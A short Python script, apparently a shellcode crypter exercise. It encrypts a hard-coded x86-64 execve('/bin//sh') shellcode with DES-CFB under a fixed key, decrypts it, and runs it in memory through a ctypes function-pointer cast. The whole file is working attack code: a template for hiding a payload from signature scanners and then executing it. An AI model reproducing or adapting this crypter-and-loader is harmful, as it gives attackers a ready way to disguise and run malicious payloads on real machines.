from ctypes import *
from Crypto.Cipher import DES
from Crypto import Random

iv = Random.get_random_bytes(8)
des1 = DES.new('01234567', DES.MODE_CFB, iv)
des2 = DES.new('01234567', DES.MODE_CFB, iv)

#Shellcode
buf =  ""
buf += "\x48\x31\xf6\x48\xf7\xe6\x66\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x6a\x3b\x58\x0f\x05"

#Method to print our shellcode
def print_shellcode(shellcode):
        encoded = ""
        for x in bytearray(shellcode):
                value = x
                encoded += '\\x'
                encoded += '%02x' % value
        print (encoded)

#Encryption
encrypted_shellcode = des1.encrypt(buf)

#Encrypted Shellcode
print ("Encrypted shellcode ...")
print_shellcode(encrypted_shellcode)

#Decryption
decrypted = des2.decrypt(encrypted_shellcode)

#Decrypted Shellcode
print 'Decrypted shellcode ...'
print_shellcode(decrypted)

#Sending shellcode to stack and executing it
memorywithshell = create_string_buffer(decrypted, len(decrypted))
print (len(decrypted))
shellcode = cast(memorywithshell, CFUNCTYPE(c_void_p))

shellcode()

